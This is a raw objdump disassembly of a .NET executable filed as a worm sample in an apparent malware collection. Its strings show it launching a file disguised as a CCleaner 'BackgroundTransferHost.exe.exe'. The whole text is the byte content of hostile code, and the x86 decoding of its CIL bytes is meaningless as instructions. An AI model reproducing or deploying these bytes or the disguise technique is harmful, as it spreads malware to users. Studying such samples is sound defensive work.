
malware_samples/worm/281648d3f16fa8c9b39c2d0d01ad489877eca87beb9d8f7a946912c40c0aefc7.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	d0 27                	shlb   $1,(%edi)
  402002:	00 00                	add    %al,(%eax)
  402004:	00 00                	add    %al,(%eax)
  402006:	00 00                	add    %al,(%eax)
  402008:	48                   	dec    %eax
  402009:	00 00                	add    %al,(%eax)
  40200b:	00 02                	add    %al,(%edx)
  40200d:	00 05 00 28 21 00    	add    %al,0x212800
  402013:	00 70 06             	add    %dh,0x6(%eax)
  402016:	00 00                	add    %al,(%eax)
  402018:	01 00                	add    %eax,(%eax)
  40201a:	00 00                	add    %al,(%eax)
  40201c:	01 00                	add    %eax,(%eax)
  40201e:	00 06                	add    %al,(%esi)
	...
  402050:	1e                   	push   %ds
  402051:	02 28                	add    (%eax),%ch
  402053:	04 00                	add    $0x0,%al
  402055:	00 0a                	add    %cl,(%edx)
  402057:	2a 0b                	sub    (%ebx),%cl
  402059:	30 03                	xor    %al,(%ebx)
  40205b:	00 21                	add    %ah,(%ecx)
  40205d:	00 00                	add    %al,(%eax)
  40205f:	00 00                	add    %al,(%eax)
  402061:	00 00                	add    %al,(%eax)
  402063:	00 72 01             	add    %dh,0x1(%edx)
  402066:	00 00                	add    %al,(%eax)
  402068:	70 72                	jo     0x4020dc
  40206a:	8a 00                	mov    (%eax),%al
  40206c:	00 70 02             	add    %dh,0x2(%eax)
  40206f:	7b 02                	jnp    0x402073
  402071:	00 00                	add    %al,(%eax)
  402073:	04 28                	add    $0x28,%al
  402075:	06                   	push   %es
  402076:	00 00                	add    %al,(%eax)
  402078:	0a 28                	or     (%eax),%ch
  40207a:	07                   	pop    %es
  40207b:	00 00                	add    %al,(%eax)
  40207d:	0a 26                	or     (%esi),%ah
  40207f:	de 03                	fiadds (%ebx)
  402081:	26 de 00             	fiadds %es:(%eax)
  402084:	2a 00                	sub    (%eax),%al
  402086:	00 00                	add    %al,(%eax)
  402088:	01 10                	add    %edx,(%eax)
  40208a:	00 00                	add    %al,(%eax)
  40208c:	00 00                	add    %al,(%eax)
  40208e:	00 00                	add    %al,(%eax)
  402090:	1d 1d 00 03 01       	sbb    $0x103001d,%eax
  402095:	00 00                	add    %al,(%eax)
  402097:	01 0b                	add    %ecx,(%ebx)
  402099:	30 01                	xor    %al,(%ecx)
  40209b:	00 11                	add    %dl,(%ecx)
  40209d:	00 00                	add    %al,(%eax)
  40209f:	00 00                	add    %al,(%eax)
  4020a1:	00 00                	add    %al,(%eax)
  4020a3:	00 72 8e             	add    %dh,-0x72(%edx)
  4020a6:	00 00                	add    %al,(%eax)
  4020a8:	70 28                	jo     0x4020d2
  4020aa:	08 00                	or     %al,(%eax)
  4020ac:	00 0a                	add    %cl,(%edx)
  4020ae:	26 de 03             	fiadds %es:(%ebx)
  4020b1:	26 de 00             	fiadds %es:(%eax)
  4020b4:	2a 00                	sub    (%eax),%al
  4020b6:	00 00                	add    %al,(%eax)
  4020b8:	01 10                	add    %edx,(%eax)
  4020ba:	00 00                	add    %al,(%eax)
  4020bc:	00 00                	add    %al,(%eax)
  4020be:	00 00                	add    %al,(%eax)
  4020c0:	0d 0d 00 03 01       	or     $0x103000d,%eax
  4020c5:	00 00                	add    %al,(%eax)
  4020c7:	01 13                	add    %edx,(%ebx)
  4020c9:	30 02                	xor    %al,(%edx)
  4020cb:	00 4b 00             	add    %cl,0x0(%ebx)
  4020ce:	00 00                	add    %al,(%eax)
  4020d0:	01 00                	add    %eax,(%eax)
  4020d2:	00 11                	add    %dl,(%ecx)
  4020d4:	73 04                	jae    0x4020da
  4020d6:	00 00                	add    %al,(%eax)
  4020d8:	06                   	push   %es
  4020d9:	0a 06                	or     (%esi),%al
  4020db:	02 7d 02             	add    0x2(%ebp),%bh
  4020de:	00 00                	add    %al,(%eax)
  4020e0:	04 06                	add    $0x6,%al
  4020e2:	fe 06                	incb   (%esi)
  4020e4:	05 00 00 06 73       	add    $0x73060000,%eax
  4020e9:	09 00                	or     %eax,(%eax)
  4020eb:	00 0a                	add    %cl,(%edx)
  4020ed:	73 0a                	jae    0x4020f9
  4020ef:	00 00                	add    %al,(%eax)
  4020f1:	0a 28                	or     (%eax),%ch
  4020f3:	0b 00                	or     (%eax),%eax
  4020f5:	00 0a                	add    %cl,(%edx)
  4020f7:	7e 01                	jle    0x4020fa
  4020f9:	00 00                	add    %al,(%eax)
  4020fb:	04 2d                	add    $0x2d,%al
  4020fd:	11 14 fe             	adc    %edx,(%esi,%edi,8)
  402100:	06                   	push   %es
  402101:	03 00                	add    (%eax),%eax
  402103:	00 06                	add    %al,(%esi)
  402105:	73 09                	jae    0x402110
  402107:	00 00                	add    %al,(%eax)
  402109:	0a 80 01 00 00 04    	or     0x4000001(%eax),%al
  40210f:	7e 01                	jle    0x402112
  402111:	00 00                	add    %al,(%eax)
  402113:	04 73                	add    $0x73,%al
  402115:	0a 00                	or     (%eax),%al
  402117:	00 0a                	add    %cl,(%edx)
  402119:	28 0b                	sub    %cl,(%ebx)
  40211b:	00 00                	add    %al,(%eax)
  40211d:	0a 2a                	or     (%edx),%ch
  40211f:	1e                   	push   %ds
  402120:	02 28                	add    (%eax),%ch
  402122:	04 00                	add    $0x0,%al
  402124:	00 0a                	add    %cl,(%edx)
  402126:	2a 00                	sub    (%eax),%al
  402128:	42                   	inc    %edx
  402129:	53                   	push   %ebx
  40212a:	4a                   	dec    %edx
  40212b:	42                   	inc    %edx
  40212c:	01 00                	add    %eax,(%eax)
  40212e:	01 00                	add    %eax,(%eax)
  402130:	00 00                	add    %al,(%eax)
  402132:	00 00                	add    %al,(%eax)
  402134:	0c 00                	or     $0x0,%al
  402136:	00 00                	add    %al,(%eax)
  402138:	76 34                	jbe    0x40216e
  40213a:	2e 30 2e             	xor    %ch,%cs:(%esi)
  40213d:	33 30                	xor    (%eax),%esi
  40213f:	33 31                	xor    (%ecx),%esi
  402141:	39 00                	cmp    %eax,(%eax)
  402143:	00 00                	add    %al,(%eax)
  402145:	00 05 00 6c 00 00    	add    %al,0x6c00
  40214b:	00 d4                	add    %dl,%ah
  40214d:	01 00                	add    %eax,(%eax)
  40214f:	00 23                	add    %ah,(%ebx)
  402151:	7e 00                	jle    0x402153
  402153:	00 40 02             	add    %al,0x2(%eax)
  402156:	00 00                	add    %al,(%eax)
  402158:	f8                   	clc
  402159:	01 00                	add    %eax,(%eax)
  40215b:	00 23                	add    %ah,(%ebx)
  40215d:	53                   	push   %ebx
  40215e:	74 72                	je     0x4021d2
  402160:	69 6e 67 73 00 00 00 	imul   $0x73,0x67(%esi),%ebp
  402167:	00 38                	add    %bh,(%eax)
  402169:	04 00                	add    $0x0,%al
  40216b:	00 08                	add    %cl,(%eax)
  40216d:	01 00                	add    %eax,(%eax)
  40216f:	00 23                	add    %ah,(%ebx)
  402171:	55                   	push   %ebp
  402172:	53                   	push   %ebx
  402173:	00 40 05             	add    %al,0x5(%eax)
  402176:	00 00                	add    %al,(%eax)
  402178:	10 00                	adc    %al,(%eax)
  40217a:	00 00                	add    %al,(%eax)
  40217c:	23 47 55             	and    0x55(%edi),%eax
  40217f:	49                   	dec    %ecx
  402180:	44                   	inc    %esp
  402181:	00 00                	add    %al,(%eax)
  402183:	00 50 05             	add    %dl,0x5(%eax)
  402186:	00 00                	add    %al,(%eax)
  402188:	20 01                	and    %al,(%ecx)
  40218a:	00 00                	add    %al,(%eax)
  40218c:	23 42 6c             	and    0x6c(%edx),%eax
  40218f:	6f                   	outsl  %ds:(%esi),(%dx)
  402190:	62 00                	bound  %eax,(%eax)
  402192:	00 00                	add    %al,(%eax)
  402194:	00 00                	add    %al,(%eax)
  402196:	00 00                	add    %al,(%eax)
  402198:	02 00                	add    (%eax),%al
  40219a:	00 01                	add    %al,(%ecx)
  40219c:	57                   	push   %edi
  40219d:	55                   	push   %ebp
  40219e:	02 00                	add    (%eax),%al
  4021a0:	09 02                	or     %eax,(%edx)
  4021a2:	00 00                	add    %al,(%eax)
  4021a4:	00 fa                	add    %bh,%dl
  4021a6:	25 33 00 16 00       	and    $0x160033,%eax
  4021ab:	00 01                	add    %al,(%ecx)
  4021ad:	00 00                	add    %al,(%eax)
  4021af:	00 0b                	add    %cl,(%ebx)
  4021b1:	00 00                	add    %al,(%eax)
  4021b3:	00 03                	add    %al,(%ebx)
  4021b5:	00 00                	add    %al,(%eax)
  4021b7:	00 02                	add    %al,(%edx)
  4021b9:	00 00                	add    %al,(%eax)
  4021bb:	00 05 00 00 00 01    	add    %al,0x1000000
  4021c1:	00 00                	add    %al,(%eax)
  4021c3:	00 0c 00             	add    %cl,(%eax,%eax,1)
  4021c6:	00 00                	add    %al,(%eax)
  4021c8:	06                   	push   %es
  4021c9:	00 00                	add    %al,(%eax)
  4021cb:	00 01                	add    %al,(%ecx)
  4021cd:	00 00                	add    %al,(%eax)
  4021cf:	00 01                	add    %al,(%ecx)
  4021d1:	00 00                	add    %al,(%eax)
  4021d3:	00 01                	add    %al,(%ecx)
  4021d5:	00 00                	add    %al,(%eax)
  4021d7:	00 02                	add    %al,(%edx)
  4021d9:	00 00                	add    %al,(%eax)
  4021db:	00 01                	add    %al,(%ecx)
  4021dd:	00 00                	add    %al,(%eax)
  4021df:	00 00                	add    %al,(%eax)
  4021e1:	00 0a                	add    %cl,(%edx)
  4021e3:	00 01                	add    %al,(%ecx)
  4021e5:	00 00                	add    %al,(%eax)
  4021e7:	00 00                	add    %al,(%eax)
  4021e9:	00 06                	add    %al,(%esi)
  4021eb:	00 3d 00 36 00 06    	add    %bh,0x6003600
  4021f1:	00 70 00             	add    %dh,0x0(%eax)
  4021f4:	54                   	push   %esp
  4021f5:	00 06                	add    %al,(%esi)
  4021f7:	00 8c 00 54 00 06 00 	add    %cl,0x60054(%eax,%eax,1)
  4021fe:	bb 00 9b 00 06       	mov    $0x6009b00,%ebx
  402203:	00 db                	add    %bl,%bl
  402205:	00 9b 00 06 00 4a    	add    %bl,0x4a000600(%ebx)
  40220b:	01 39                	add    %edi,(%ecx)
  40220d:	01 06                	add    %eax,(%esi)
  40220f:	00 7d 01             	add    %bh,0x1(%ebp)
  402212:	9b                   	fwait
  402213:	00 06                	add    %al,(%esi)
  402215:	00 98 01 36 00 0a    	add    %bl,0xa003601(%eax)
  40221b:	00 b7 01 a4 01 06    	add    %dh,0x601a401(%edi)
  402221:	00 c5                	add    %al,%ch
  402223:	01 39                	add    %edi,(%ecx)
  402225:	01 06                	add    %eax,(%esi)
  402227:	00 dc                	add    %bl,%ah
  402229:	01 cc                	add    %ecx,%esp
  40222b:	01 00                	add    %eax,(%eax)
  40222d:	00 00                	add    %al,(%eax)
  40222f:	00 01                	add    %al,(%ecx)
  402231:	00 00                	add    %al,(%eax)
  402233:	00 00                	add    %al,(%eax)
  402235:	00 01                	add    %al,(%ecx)
  402237:	00 01                	add    %al,(%ecx)
  402239:	00 00                	add    %al,(%eax)
  40223b:	00 10                	add    %dl,(%eax)
  40223d:	00 25 00 00 00 05    	add    %ah,0x5000000
  402243:	00 01                	add    %al,(%ecx)
  402245:	00 01                	add    %al,(%ecx)
  402247:	00 03                	add    %al,(%ebx)
  402249:	01 10                	add    %edx,(%eax)
  40224b:	00 10                	add    %dl,(%eax)
  40224d:	01 00                	add    %eax,(%eax)
  40224f:	00 05 00 02 00 04    	add    %al,0x4000200
  402255:	00 11                	add    %dl,(%ecx)
  402257:	00 56 01             	add    %dl,0x1(%esi)
  40225a:	27                   	daa
  40225b:	00 06                	add    %al,(%esi)
  40225d:	00 4f 00             	add    %cl,0x0(%edi)
  402260:	1f                   	pop    %ds
  402261:	00 c8                	add    %cl,%al
  402263:	20 00                	and    %al,(%eax)
  402265:	00 00                	add    %al,(%eax)
  402267:	00 91 00 44 00 0a    	add    %dl,0xa004400(%ecx)
  40226d:	00 01                	add    %al,(%ecx)
  40226f:	00 1f                	add    %bl,(%edi)
  402271:	21 00                	and    %eax,(%eax)
  402273:	00 00                	add    %al,(%eax)
  402275:	00 86 18 49 00 10    	add    %al,0x10004918(%esi)
  40227b:	00 02                	add    %al,(%edx)
  40227d:	00 98 20 00 00 00    	add    %bl,0x20(%eax)
  402283:	00 91 00 2e 01 23    	add    %dl,0x23012e00(%ecx)
  402289:	00 02                	add    %al,(%edx)
  40228b:	00 50 20             	add    %dl,0x20(%eax)
  40228e:	00 00                	add    %al,(%eax)
  402290:	00 00                	add    %al,(%eax)
  402292:	86 18                	xchg   %bl,(%eax)
  402294:	49                   	dec    %ecx
  402295:	00 10                	add    %dl,(%eax)
  402297:	00 02                	add    %al,(%edx)
  402299:	00 58 20             	add    %bl,0x20(%eax)
  40229c:	00 00                	add    %al,(%eax)
  40229e:	00 00                	add    %al,(%eax)
  4022a0:	86 00                	xchg   %al,(%eax)
  4022a2:	23 01                	and    (%ecx),%eax
  4022a4:	10 00                	adc    %al,(%eax)
  4022a6:	02 00                	add    (%eax),%al
  4022a8:	00 00                	add    %al,(%eax)
  4022aa:	01 00                	add    %eax,(%eax)
  4022ac:	4f                   	dec    %edi
  4022ad:	00 11                	add    %dl,(%ecx)
  4022af:	00 49 00             	add    %cl,0x0(%ecx)
  4022b2:	14 00                	adc    $0x0,%al
  4022b4:	21 00                	and    %eax,(%eax)
  4022b6:	49                   	dec    %ecx
  4022b7:	00 1a                	add    %bl,(%edx)
  4022b9:	00 29                	add    %ch,(%ecx)
  4022bb:	00 49 00             	add    %cl,0x0(%ecx)
  4022be:	10 00                	adc    %al,(%eax)
  4022c0:	09 00                	or     %eax,(%eax)
  4022c2:	49                   	dec    %ecx
  4022c3:	00 10                	add    %dl,(%eax)
  4022c5:	00 39                	add    %bh,(%ecx)
  4022c7:	00 49 00             	add    %cl,0x0(%ecx)
  4022ca:	10 00                	adc    %al,(%eax)
  4022cc:	41                   	inc    %ecx
  4022cd:	00 9f 01 30 00 49    	add    %bl,0x49003001(%edi)
  4022d3:	00 bf 01 37 00 49    	add    %bh,0x49003701(%edi)
  4022d9:	00 bf 01 3e 00 31    	add    %bh,0x31003e01(%edi)
  4022df:	00 49 00             	add    %cl,0x0(%ecx)
  4022e2:	44                   	inc    %esp
  4022e3:	00 51 00             	add    %dl,0x0(%ecx)
  4022e6:	49                   	dec    %ecx
  4022e7:	00 4a 00             	add    %cl,0x0(%edx)
  4022ea:	51                   	push   %ecx
  4022eb:	00 bf 01 10 00 59    	add    %bh,0x59001001(%edi)
  4022f1:	00 49 00             	add    %cl,0x0(%ecx)
  4022f4:	10 00                	adc    %al,(%eax)
  4022f6:	21 00                	and    %eax,(%eax)
  4022f8:	2b 00                	sub    (%eax),%eax
  4022fa:	2b 00                	sub    (%eax),%eax
  4022fc:	27                   	daa
  4022fd:	00 63 00             	add    %ah,0x0(%ebx)
  402300:	2b 00                	sub    (%eax),%eax
  402302:	2e 00 1b             	add    %bl,%cs:(%ebx)
  402305:	00 5e 00             	add    %bl,0x0(%esi)
  402308:	2e 00 13             	add    %dl,%cs:(%ebx)
  40230b:	00 55 00             	add    %dl,0x0(%ebp)
  40230e:	60                   	pusha
  40230f:	00 2b                	add    %ch,(%ebx)
  402311:	00 2b                	add    %ch,(%ebx)
  402313:	00 63 00             	add    %ah,0x0(%ebx)
  402316:	2b 00                	sub    (%eax),%eax
  402318:	2b 00                	sub    (%eax),%eax
  40231a:	08 00                	or     %al,(%eax)
  40231c:	06                   	push   %es
  40231d:	00 7d 00             	add    %bh,0x0(%ebp)
  402320:	50                   	push   %eax
  402321:	00 04 80             	add    %al,(%eax,%eax,4)
	...
  402334:	f9                   	stc
  402335:	00 00                	add    %al,(%eax)
  402337:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  402342:	00 00                	add    %al,(%eax)
  402344:	01 00                	add    %eax,(%eax)
  402346:	2d 00 00 00 00       	sub    $0x0,%eax
  40234b:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  402356:	00 00                	add    %al,(%eax)
  402358:	01 00                	add    %eax,(%eax)
  40235a:	36 00 00             	add    %al,%ss:(%eax)
  40235d:	00 00                	add    %al,(%eax)
  40235f:	00 03                	add    %al,(%ebx)
  402361:	00 02                	add    %al,(%edx)
  402363:	00 00                	add    %al,(%eax)
  402365:	00 00                	add    %al,(%eax)
  402367:	00 00                	add    %al,(%eax)
  402369:	3c 4d                	cmp    $0x4d,%al
  40236b:	6f                   	outsl  %ds:(%esi),(%dx)
  40236c:	64 75 6c             	fs jne 0x4023db
  40236f:	65 3e 00 42 61       	gs add %al,%ds:0x61(%edx)
  402374:	63 6b 67             	arpl   %ebp,0x67(%ebx)
  402377:	72 6f                	jb     0x4023e8
  402379:	75 6e                	jne    0x4023e9
  40237b:	64 54                	fs push %esp
  40237d:	72 61                	jb     0x4023e0
  40237f:	6e                   	outsb  %ds:(%esi),(%dx)
  402380:	73 66                	jae    0x4023e8
  402382:	65 72 48             	gs jb  0x4023cd
  402385:	6f                   	outsl  %ds:(%esi),(%dx)
  402386:	73 74                	jae    0x4023fc
  402388:	2e 65 78 65          	cs js,pn 0x4023f1
  40238c:	00 50 72             	add    %dl,0x72(%eax)
  40238f:	6f                   	outsl  %ds:(%esi),(%dx)
  402390:	67 72 61             	addr16 jb 0x4023f4
  402393:	6d                   	insl   (%dx),%es:(%edi)
  402394:	00 6d 73             	add    %ch,0x73(%ebp)
  402397:	63 6f 72             	arpl   %ebp,0x72(%edi)
  40239a:	6c                   	insb   (%dx),%es:(%edi)
  40239b:	69 62 00 53 79 73 74 	imul   $0x74737953,0x0(%edx),%esp
  4023a2:	65 6d                	gs insl (%dx),%es:(%edi)
  4023a4:	00 4f 62             	add    %cl,0x62(%edi)
  4023a7:	6a 65                	push   $0x65
  4023a9:	63 74 00 4d          	arpl   %esi,0x4d(%eax,%eax,1)
  4023ad:	61                   	popa
  4023ae:	69 6e 00 2e 63 74 6f 	imul   $0x6f74632e,0x0(%esi),%ebp
  4023b5:	72 00                	jb     0x4023b7
  4023b7:	61                   	popa
  4023b8:	72 67                	jb     0x402421
  4023ba:	73 00                	jae    0x4023bc
  4023bc:	53                   	push   %ebx
  4023bd:	79 73                	jns    0x402432
  4023bf:	74 65                	je     0x402426
  4023c1:	6d                   	insl   (%dx),%es:(%edi)
  4023c2:	2e 53                	cs push %ebx
  4023c4:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  4023c8:	69 74 79 2e 50 65 72 	imul   $0x6d726550,0x2e(%ecx,%edi,2),%esi
  4023cf:	6d 
  4023d0:	69 73 73 69 6f 6e 73 	imul   $0x736e6f69,0x73(%ebx),%esi
  4023d7:	00 53 65             	add    %dl,0x65(%ebx)
  4023da:	63 75 72             	arpl   %esi,0x72(%ebp)
  4023dd:	69 74 79 50 65 72 6d 	imul   $0x696d7265,0x50(%ecx,%edi,2),%esi
  4023e4:	69 
  4023e5:	73 73                	jae    0x40245a
  4023e7:	69 6f 6e 41 74 74 72 	imul   $0x72747441,0x6e(%edi),%ebp
  4023ee:	69 62 75 74 65 00 53 	imul   $0x53006574,0x75(%edx),%esp
  4023f5:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  4023f9:	69 74 79 41 63 74 69 	imul   $0x6f697463,0x41(%ecx,%edi,2),%esi
  402400:	6f 
  402401:	6e                   	outsb  %ds:(%esi),(%dx)
  402402:	00 53 79             	add    %dl,0x79(%ebx)
  402405:	73 74                	jae    0x40247b
  402407:	65 6d                	gs insl (%dx),%es:(%edi)
  402409:	2e 52                	cs push %edx
  40240b:	75 6e                	jne    0x40247b
  40240d:	74 69                	je     0x402478
  40240f:	6d                   	insl   (%dx),%es:(%edi)
  402410:	65 2e 43             	gs cs inc %ebx
  402413:	6f                   	outsl  %ds:(%esi),(%dx)
  402414:	6d                   	insl   (%dx),%es:(%edi)
  402415:	70 69                	jo     0x402480
  402417:	6c                   	insb   (%dx),%es:(%edi)
  402418:	65 72 53             	gs jb  0x40246e
  40241b:	65 72 76             	gs jb  0x402494
  40241e:	69 63 65 73 00 43 6f 	imul   $0x6f430073,0x65(%ebx),%esp
  402425:	6d                   	insl   (%dx),%es:(%edi)
  402426:	70 69                	jo     0x402491
  402428:	6c                   	insb   (%dx),%es:(%edi)
  402429:	61                   	popa
  40242a:	74 69                	je     0x402495
  40242c:	6f                   	outsl  %ds:(%esi),(%dx)
  40242d:	6e                   	outsb  %ds:(%esi),(%dx)
  40242e:	52                   	push   %edx
  40242f:	65 6c                	gs insb (%dx),%es:(%edi)
  402431:	61                   	popa
  402432:	78 61                	js     0x402495
  402434:	74 69                	je     0x40249f
  402436:	6f                   	outsl  %ds:(%esi),(%dx)
  402437:	6e                   	outsb  %ds:(%esi),(%dx)
  402438:	73 41                	jae    0x40247b
  40243a:	74 74                	je     0x4024b0
  40243c:	72 69                	jb     0x4024a7
  40243e:	62 75 74             	bound  %esi,0x74(%ebp)
  402441:	65 00 52 75          	add    %dl,%gs:0x75(%edx)
  402445:	6e                   	outsb  %ds:(%esi),(%dx)
  402446:	74 69                	je     0x4024b1
  402448:	6d                   	insl   (%dx),%es:(%edi)
  402449:	65 43                	gs inc %ebx
  40244b:	6f                   	outsl  %ds:(%esi),(%dx)
  40244c:	6d                   	insl   (%dx),%es:(%edi)
  40244d:	70 61                	jo     0x4024b0
  40244f:	74 69                	je     0x4024ba
  402451:	62 69 6c             	bound  %ebp,0x6c(%ecx)
  402454:	69 74 79 41 74 74 72 	imul   $0x69727474,0x41(%ecx,%edi,2),%esi
  40245b:	69 
  40245c:	62 75 74             	bound  %esi,0x74(%ebp)
  40245f:	65 00 42 61          	add    %al,%gs:0x61(%edx)
  402463:	63 6b 67             	arpl   %ebp,0x67(%ebx)
  402466:	72 6f                	jb     0x4024d7
  402468:	75 6e                	jne    0x4024d8
  40246a:	64 54                	fs push %esp
  40246c:	72 61                	jb     0x4024cf
  40246e:	6e                   	outsb  %ds:(%esi),(%dx)
  40246f:	73 66                	jae    0x4024d7
  402471:	65 72 48             	gs jb  0x4024bc
  402474:	6f                   	outsl  %ds:(%esi),(%dx)
  402475:	73 74                	jae    0x4024eb
  402477:	00 3c 3e             	add    %bh,(%esi,%edi,1)
  40247a:	63 5f 5f             	arpl   %ebx,0x5f(%edi)
  40247d:	44                   	inc    %esp
  40247e:	69 73 70 6c 61 79 43 	imul   $0x4379616c,0x70(%ebx),%esi
  402485:	6c                   	insb   (%dx),%es:(%edi)
  402486:	61                   	popa
  402487:	73 73                	jae    0x4024fc
  402489:	33 00                	xor    (%eax),%eax
  40248b:	3c 4d                	cmp    $0x4d,%al
  40248d:	61                   	popa
  40248e:	69 6e 3e 62 5f 5f 30 	imul   $0x305f5f62,0x3e(%esi),%ebp
  402495:	00 3c 4d 61 69 6e 3e 	add    %bh,0x3e6e6961(,%ecx,2)
  40249c:	62 5f 5f             	bound  %ebx,0x5f(%edi)
  40249f:	31 00                	xor    %eax,(%eax)
  4024a1:	53                   	push   %ebx
  4024a2:	79 73                	jns    0x402517
  4024a4:	74 65                	je     0x40250b
  4024a6:	6d                   	insl   (%dx),%es:(%edi)
  4024a7:	2e 54                	cs push %esp
  4024a9:	68 72 65 61 64       	push   $0x64616572
  4024ae:	69 6e 67 00 54 68 72 	imul   $0x72685400,0x67(%esi),%ebp
  4024b5:	65 61                	gs popa
  4024b7:	64 53                	fs push %ebx
  4024b9:	74 61                	je     0x40251c
  4024bb:	72 74                	jb     0x402531
  4024bd:	00 43 53             	add    %al,0x53(%ebx)
  4024c0:	24 3c                	and    $0x3c,%al
  4024c2:	3e 39 5f 5f          	cmp    %ebx,%ds:0x5f(%edi)
  4024c6:	43                   	inc    %ebx
  4024c7:	61                   	popa
  4024c8:	63 68 65             	arpl   %ebp,0x65(%eax)
  4024cb:	64 41                	fs inc %ecx
  4024cd:	6e                   	outsb  %ds:(%esi),(%dx)
  4024ce:	6f                   	outsl  %ds:(%esi),(%dx)
  4024cf:	6e                   	outsb  %ds:(%esi),(%dx)
  4024d0:	79 6d                	jns    0x40253f
  4024d2:	6f                   	outsl  %ds:(%esi),(%dx)
  4024d3:	75 73                	jne    0x402548
  4024d5:	4d                   	dec    %ebp
  4024d6:	65 74 68             	gs je  0x402541
  4024d9:	6f                   	outsl  %ds:(%esi),(%dx)
  4024da:	64 44                	fs inc %esp
  4024dc:	65 6c                	gs insb (%dx),%es:(%edi)
  4024de:	65 67 61             	gs addr16 popa
  4024e1:	74 65                	je     0x402548
  4024e3:	32 00                	xor    (%eax),%al
  4024e5:	43                   	inc    %ebx
  4024e6:	6f                   	outsl  %ds:(%esi),(%dx)
  4024e7:	6d                   	insl   (%dx),%es:(%edi)
  4024e8:	70 69                	jo     0x402553
  4024ea:	6c                   	insb   (%dx),%es:(%edi)
  4024eb:	65 72 47             	gs jb  0x402535
  4024ee:	65 6e                	outsb  %gs:(%esi),(%dx)
  4024f0:	65 72 61             	gs jb  0x402554
  4024f3:	74 65                	je     0x40255a
  4024f5:	64 41                	fs inc %ecx
  4024f7:	74 74                	je     0x40256d
  4024f9:	72 69                	jb     0x402564
  4024fb:	62 75 74             	bound  %esi,0x74(%ebp)
  4024fe:	65 00 53 74          	add    %dl,%gs:0x74(%ebx)
  402502:	72 69                	jb     0x40256d
  402504:	6e                   	outsb  %ds:(%esi),(%dx)
  402505:	67 00 4a 6f          	add    %cl,0x6f(%bp,%si)
  402509:	69 6e 00 53 79 73 74 	imul   $0x74737953,0x0(%esi),%ebp
  402510:	65 6d                	gs insl (%dx),%es:(%edi)
  402512:	2e 44                	cs inc %esp
  402514:	69 61 67 6e 6f 73 74 	imul   $0x74736f6e,0x67(%ecx),%esp
  40251b:	69 63 73 00 50 72 6f 	imul   $0x6f725000,0x73(%ebx),%esp
  402522:	63 65 73             	arpl   %esp,0x73(%ebp)
  402525:	73 00                	jae    0x402527
  402527:	53                   	push   %ebx
  402528:	74 61                	je     0x40258b
  40252a:	72 74                	jb     0x4025a0
  40252c:	00 54 68 72          	add    %dl,0x72(%eax,%ebp,2)
  402530:	65 61                	gs popa
  402532:	64 00 53 79          	add    %dl,%fs:0x79(%ebx)
  402536:	73 74                	jae    0x4025ac
  402538:	65 6d                	gs insl (%dx),%es:(%edi)
  40253a:	2e 53                	cs push %ebx
  40253c:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  402540:	69 74 79 00 55 6e 76 	imul   $0x65766e55,0x0(%ecx,%edi,2),%esi
  402547:	65 
  402548:	72 69                	jb     0x4025b3
  40254a:	66 69 61 62 6c 65    	imul   $0x656c,0x62(%ecx),%sp
  402550:	43                   	inc    %ebx
  402551:	6f                   	outsl  %ds:(%esi),(%dx)
  402552:	64 65 41             	fs gs inc %ecx
  402555:	74 74                	je     0x4025cb
  402557:	72 69                	jb     0x4025c2
  402559:	62 75 74             	bound  %esi,0x74(%ebp)
  40255c:	65 00 00             	add    %al,%gs:(%eax)
  40255f:	00 00                	add    %al,(%eax)
  402561:	80 87 43 00 3a 00 5c 	addb   $0x5c,0x3a0043(%edi)
  402568:	00 55 00             	add    %dl,0x0(%ebp)
  40256b:	73 00                	jae    0x40256d
  40256d:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  402571:	73 00                	jae    0x402573
  402573:	5c                   	pop    %esp
  402574:	00 41 00             	add    %al,0x0(%ecx)
  402577:	6c                   	insb   (%dx),%es:(%edi)
  402578:	00 6c 00 20          	add    %ch,0x20(%eax,%eax,1)
  40257c:	00 55 00             	add    %dl,0x0(%ebp)
  40257f:	73 00                	jae    0x402581
  402581:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  402585:	73 00                	jae    0x402587
  402587:	5c                   	pop    %esp
  402588:	00 50 00             	add    %dl,0x0(%eax)
  40258b:	69 00 72 00 69 00    	imul   $0x690072,(%eax),%eax
  402591:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  402595:	72 00                	jb     0x402597
  402597:	6d                   	insl   (%dx),%es:(%edi)
  402598:	00 5c 00 43          	add    %bl,0x43(%eax,%eax,1)
  40259c:	00 43 00             	add    %al,0x0(%ebx)
  40259f:	6c                   	insb   (%dx),%es:(%edi)
  4025a0:	00 65 00             	add    %ah,0x0(%ebp)
  4025a3:	61                   	popa
  4025a4:	00 6e 00             	add    %ch,0x0(%esi)
  4025a7:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  4025ab:	5c                   	pop    %esp
  4025ac:	00 42 00             	add    %al,0x0(%edx)
  4025af:	61                   	popa
  4025b0:	00 63 00             	add    %ah,0x0(%ebx)
  4025b3:	6b 00 67             	imul   $0x67,(%eax),%eax
  4025b6:	00 72 00             	add    %dh,0x0(%edx)
  4025b9:	6f                   	outsl  %ds:(%esi),(%dx)
  4025ba:	00 75 00             	add    %dh,0x0(%ebp)
  4025bd:	6e                   	outsb  %ds:(%esi),(%dx)
  4025be:	00 64 00 54          	add    %ah,0x54(%eax,%eax,1)
  4025c2:	00 72 00             	add    %dh,0x0(%edx)
  4025c5:	61                   	popa
  4025c6:	00 6e 00             	add    %ch,0x0(%esi)
  4025c9:	73 00                	jae    0x4025cb
  4025cb:	66 00 65 00          	data16 add %ah,0x0(%ebp)
  4025cf:	72 00                	jb     0x4025d1
  4025d1:	48                   	dec    %eax
  4025d2:	00 6f 00             	add    %ch,0x0(%edi)
  4025d5:	73 00                	jae    0x4025d7
  4025d7:	74 00                	je     0x4025d9
  4025d9:	2e 00 65 00          	add    %ah,%cs:0x0(%ebp)
  4025dd:	78 00                	js     0x4025df
  4025df:	65 00 2e             	add    %ch,%gs:(%esi)
  4025e2:	00 65 00             	add    %ah,0x0(%ebp)
  4025e5:	78 00                	js     0x4025e7
  4025e7:	65 00 00             	add    %al,%gs:(%eax)
  4025ea:	03 20                	add    (%eax),%esp
  4025ec:	00 00                	add    %al,(%eax)
